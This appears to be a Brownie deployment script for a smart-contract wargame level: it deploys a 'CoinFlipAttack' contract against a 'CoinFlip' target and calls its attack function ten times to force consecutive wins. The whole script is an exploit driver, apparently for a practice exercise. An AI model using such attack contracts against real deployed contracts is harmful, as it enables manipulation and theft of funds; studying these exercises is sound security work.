from brownie import accounts, CoinFlipAttack


def main():
    # update below with your account mnemonic
    my_account = accounts.from_mnemonic("your account mnemonic")
    # update below with the CoinFlip address
    attack_contract = CoinFlipAttack.deploy("CoinFlip Address",{'from': my_account})
    # calls the attack function 10 times
    for i in range(0,10):
        attack_contract.attack({'from':my_account})
